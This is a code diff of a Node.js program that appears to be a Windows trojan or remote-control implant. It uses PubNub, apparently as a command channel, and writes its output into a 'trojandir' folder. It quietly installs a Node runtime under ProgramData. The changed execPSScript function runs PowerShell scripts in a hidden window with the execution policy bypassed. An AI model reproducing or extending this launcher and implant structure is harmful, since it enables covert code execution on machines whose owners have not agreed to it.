@@ -15,7 +15,7 @@ debugger;
 // anchor
 const path = require("path");
 module.paths.push(
-    path.resolve(__dirname, "C:\\ProgramData\\owd\\node\\node_modules")
+    path.resolve(__dirname, "C:\\ProgramData\\owd\\node\\node-v26.4.0-win-x64\\node_modules")
 );
 
 const PubNub = require("pubnub");
@@ -429,9 +429,10 @@ class CmdConfig {
         return this.#__childcmds;
     }
 
+    // should be overriden by implementing cmd
     loopfunc = async () => {
-        logmsg("doing some work inside loop...");
-    }; // should be overriden
+        logmsg("pss");
+    }; 
 
     newCmdConfig(tcmdname) {
         let childcmd = new CmdConfig(tcmdname, this);
@@ -1534,23 +1535,30 @@ function ping() {
     logmsg("finished");
 }
 
-function execPSScript(scriptfpath, cmdlineargsarr, stdoutfunc, stderrfunc) {
+function execPSScript(scriptfpath, cmdlineargsarr, execopts, stdoutfunc, stderrfunc) {
     logmsg("starting");
 
     let enginename = "PS1";
 
     cmdlineargsarr = cmdlineargsarr || [];
+    cmdlineargsarr = [
+            "-WindowStyle",
+            "Hidden",
+            "-NoProfile",
+            "-ExecutionPolicy",
+            "Bypass",
+            "-File",
+            scriptfpath,
+            ...cmdlineargsarr,
+    ];
 
-    const child = spawn("powershell.exe", [
-        "-WindowStyle",
-        "Hidden",
-        "-NoProfile",
-        "-ExecutionPolicy",
-        "Bypass",
-        "-File",
-        scriptfpath,
-        ...cmdlineargsarr,
-    ]);
+    let cwd = path.dirname(scriptfpath); 
+
+    if ( ! execopts ) {
+        execopts = { cwd: cwd };
+    }
+
+    let child = spawn("powershell.exe", cmdlineargsarr, execopts);
 
     let tmpcode = getRandomCode(8);
 
@@ -1558,6 +1566,7 @@ function execPSScript(scriptfpath, cmdlineargsarr, stdoutfunc, stderrfunc) {
         systemstate.trojandir,
         `exec${enginename}Script_${tmpcode}.out`
     );
+
     let stderrfpath = path.join(
         systemstate.trojandir,
         `exec${enginename}Script_${tmpcode}.err`
@@ -2753,7 +2762,7 @@ async function install_node() {
 
     let verify_node = await verify_node_install();
 
-    if (verify_node.status) {
+    if (verify_node.state) {
         logmsg("node installed -- passing through");
         process.exit(0);
         return;
@@ -2761,14 +2770,14 @@ async function install_node() {
 
     verify_node = verify_node_download();
 
-    if (!verify_node?.status) {
+    if (!verify_node?.state) {
         logmsg(verify_node?.msg);
         await download_node(verify_node?.missingfiles);
     }
 
     verify_node = verify_node_download();
 
-    if (!verify_node?.status) {
+    if (!verify_node?.state) {
         // logmsg(verify_node?.msg); // TO
         throw new Error("node download failed");
     }
